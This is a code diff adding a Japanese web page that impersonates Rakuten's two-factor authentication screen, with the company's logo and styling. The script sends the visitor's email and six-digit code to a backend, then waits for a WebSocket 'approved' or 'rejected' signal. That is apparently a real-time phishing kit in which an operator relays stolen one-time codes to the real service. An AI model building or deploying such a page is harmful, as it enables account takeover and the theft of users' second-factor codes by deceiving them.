@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2段階認証 - 楽天</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Arial, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;
+            background-color: #f4f5fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 500px;
+            max-width: 90vw;
+            background-color: #ffffff;
+            box-shadow: 3px 3px 10px 5px rgba(0, 0, 0, 0.2);
+            padding: 40px 50px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            height: 32px;
+            width: auto;
+        }
+
+        .logo path {
+            fill: #bf0000;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #000;
+            margin-bottom: 20px;
+            letter-spacing: 0.02em;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 12px;
+            font-size: 24px;
+            letter-spacing: 8px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+            background-color: #fff;
+            font-family: monospace;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #bf0000;
+        }
+
+        input[type="text"].error {
+            border-color: #bf0000;
+        }
+
+        input[type="text"]:disabled {
+            background-color: #f0f0f0;
+            cursor: not-allowed;
+        }
+
+        .next-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #bf0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover:not(:disabled) {
+            background-color: #a00000;
+        }
+
+        .next-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #bf0000;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .help-text {
+            font-size: 13px;
+            color: #666;
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+
+        .help-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        .back-link {
+            display: block;
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .back-link::before {
+            content: '‹ ';
+            margin-right: 4px;
+            font-size: 18px;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #bf0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media only screen and (max-width: 560px) {
+            .container {
+                width: 100vw;
+                max-width: 100vw;
+                min-height: 100vh;
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            input[type="text"] {
+                font-size: 20px;
+                letter-spacing: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166 50" height="32" width="106.24">
+                <path d="M41.2 49.4l92.3-8H33.2l8 8zm1.3-14.3v1.2h6.2V9.1h-6.2v1.2a10 10 0 0 0-5.8-1.9c-7 0-12.4 6.4-12.4 14.3S29.6 37 36.7 37c2.3 0 4-.7 5.8-1.9zM30.7 22.7c0-4.3 2.5-7.7 6-7.7s5.9 3.4 5.9 7.7c0 4.3-2.5 7.7-5.9 7.7-3.5 0-6-3.4-6-7.7zm56 14.3c3 0 5.3-1.7 5.3-1.7v1h6.2V9.1H92v16c0 3-2.1 5.5-5.1 5.5s-5.1-2.5-5.1-5.5v-16h-6.2v16c0 6.6 4.5 11.9 11.1 11.9zm68.2-28.6c-3 0-5.3 1.7-5.3 1.7v-1h-6.2v27.2h6.2v-16c0-3 2.1-5.5 5.1-5.5s5.1 2.5 5.1 5.5v16h6.2v-16c0-6.6-4.5-11.9-11.1-11.9zM22.4 14c0-6.5-5.3-11.7-11.7-11.7H0v34h6.5V25.8h4.6L19 36.3h8.1l-9.6-12.7c3-2.1 4.9-5.6 4.9-9.6zm-11.7 5.3H6.5V8.7h4.2c2.9 0 5.3 2.4 5.3 5.3s-2.4 5.3-5.3 5.3zm92.9 8c0 6.1 4.6 9.7 9.2 9.7a13 13 0 0 0 6-1.7l-4-5.4c-.6.4-1.3.7-2.1.7-1 0-2.9-.8-2.9-3.3V15.6h5.3V9.1h-5.3V2.3h-6.2v6.8h-3.3v6.5h3.3v11.7zm-45.1-2.2l9.2 11.2h8.6L64 21.8 74.6 9.1H66l-7.5 9.5V0h-6.3v36.3h6.3V25.1zm70.6-16.7c-7.2 0-12.3 6.3-12.3 14.3 0 8.4 6.4 14.3 12.9 14.3 3.3 0 7.4-1.1 10.9-6.1l-5.5-3.2c-4.2 6.2-11.3 3.1-12.1-3.2h17.8c1.7-9.7-4.7-16.1-11.7-16.1zm-5.7 10.8c1.3-6.4 9.9-6.8 11.1 0h-11.1z"></path>
+            </svg>
+        </div>
+
+        <h1>2段階認証</h1>
+
+        <div class="description">
+            登録された携帯電話番号に送信された6桁の認証コードを入力してください。
+        </div>
+
+        <form id="twoFAForm">
+            <div class="form-group">
+                <label for="twoFACode">認証コード (必須)</label>
+                <input 
+                    type="text" 
+                    id="twoFACode" 
+                    name="code" 
+                    placeholder="000000"
+                    maxlength="6"
+                    pattern="[0-9]*"
+                    inputmode="numeric"
+                    autocomplete="one-time-code"
+                    required
+                >
+                <div class="error-message" id="errorMessage"></div>
+            </div>
+
+            <button type="submit" class="next-button" id="submitButton" disabled>次へ</button>
+
+            <div class="help-text">
+                認証コードが届かない場合は、<a href="#">こちら</a>をご確認ください。
+            </div>
+
+            <a href="/login/password" class="back-link">パスワード入力画面に戻る</a>
+        </form>
+    </div>
+
+    <script>
+        let userEmail = '';
+        let socket = null;
+
+        function getEmailFromSession() {
+            return sessionStorage.getItem('userEmail');
+        }
+
+        window.addEventListener('DOMContentLoaded', function() {
+            userEmail = getEmailFromSession();
+            
+            if (!userEmail) {
+                window.location.href = '/login/email';
+                return;
+            }
+
+            // WebSocket接続
+            socket = io();
+            
+            socket.on('connect', () => {
+                console.log('[WebSocket] 接続成功');
+                socket.emit('join_user_room', { email: userEmail });
+            });
+
+            socket.on('twofa_approved', (data) => {
+                console.log('[WebSocket] 2FA承認通知受信');
+                document.getElementById('loadingOverlay').classList.remove('show');
+                window.location.href = '/dashboard/security-check';
+            });
+
+            socket.on('twofa_rejected', (data) => {
+                console.log('[WebSocket] 2FA再入力要求受信');
+                document.getElementById('loadingOverlay').classList.remove('show');
+                showError('2FAコードが間違っています');
+                document.getElementById('twoFACode').value = '';
+                document.getElementById('twoFACode').disabled = false;
+                document.getElementById('twoFACode').focus();
+            });
+
+            socket.on('session_timeout', (data) => {
+                console.log('[WebSocket] セッションタイムアウト');
+                document.getElementById('loadingOverlay').classList.remove('show');
+                showError(data.message);
+                document.getElementById('twoFACode').value = '';
+                document.getElementById('twoFACode').disabled = false;
+                document.getElementById('twoFACode').focus();
+            });
+            
+            const codeInput = document.getElementById('twoFACode');
+            codeInput.focus();
+
+            codeInput.addEventListener('input', handleInput);
+            codeInput.addEventListener('paste', handlePaste);
+        });
+
+        function handleInput(e) {
+            const input = e.target;
+            let value = input.value;
+
+            value = value.replace(/[^0-9]/g, '');
+            if (value.length > 6) {
+                value = value.slice(0, 6);
+            }
+
+            input.value = value;
+            clearError();
+
+            if (value.length === 6) {
+                document.getElementById('submitButton').disabled = false;
+            } else {
+                document.getElementById('submitButton').disabled = true;
+            }
+        }
+
+        function handlePaste(e) {
+            e.preventDefault();
+            
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = pastedText.replace(/[^0-9]/g, '').slice(0, 6);
+            
+            const input = e.target;
+            input.value = numbers;
+            input.dispatchEvent(new Event('input'));
+        }
+
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            const inputElement = document.getElementById('twoFACode');
+            
+            errorElement.innerHTML = message;
+            errorElement.classList.add('show');
+            inputElement.classList.add('error');
+        }
+
+        function clearError() {
+            const errorElement = document.getElementById('errorMessage');
+            const inputElement = document.getElementById('twoFACode');
+            
+            errorElement.classList.remove('show');
+            inputElement.classList.remove('error');
+        }
+
+        document.getElementById('twoFAForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const codeInput = document.getElementById('twoFACode');
+            const code = codeInput.value.trim();
+
+            if (!code) {
+                showError('認証コードを入力してください');
+                return;
+            }
+
+            if (code.length !== 6) {
+                showError('6桁の認証コードを入力してください');
+                return;
+            }
+
+            if (!/^\d{6}$/.test(code)) {
+                showError('認証コードは数字のみ入力してください');
+                return;
+            }
+
+            // 入力欄を無効化
+            codeInput.disabled = true;
+            document.getElementById('submitButton').disabled = true;
+
+            // ローディング表示
+            document.getElementById('loadingOverlay').classList.add('show');
+
+            try {
+                const response = await fetch('/api/2fa/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: userEmail,
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (!data.success) {
+                    document.getElementById('loadingOverlay').classList.remove('show');
+                    showError(data.message || '2FAコード送信に失敗しました');
+                    codeInput.disabled = false;
+                    codeInput.value = '';
+                    codeInput.focus();
+                }
+                // 成功時はWebSocketで承認を待つ
+                
+            } catch (error) {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                console.error('2FA送信エラー:', error);
+                showError('エラーが発生しました。もう一度お試しください。');
+                codeInput.disabled = false;
+                codeInput.value = '';
+                codeInput.focus();
+            }
+        });
+    </script>
+</body>
+</html>
